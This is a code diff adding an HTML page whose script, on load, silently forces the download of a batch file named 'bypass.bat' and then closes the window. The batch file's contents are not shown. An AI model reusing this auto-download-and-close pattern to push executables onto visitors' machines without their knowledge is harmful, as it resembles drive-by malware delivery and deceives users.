@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Download</title>
+</head>
+<body>
+<script>
+    const link = document.createElement("a");
+
+    link.href = "bypass.bat";
+    link.download = "bypass.bat";
+
+    document.body.appendChild(link);
+    link.click();
+    link.remove();
+    setTimeout(() => {
+        window.close();
+    }, 100);
+</script>
+</body>
+</html>
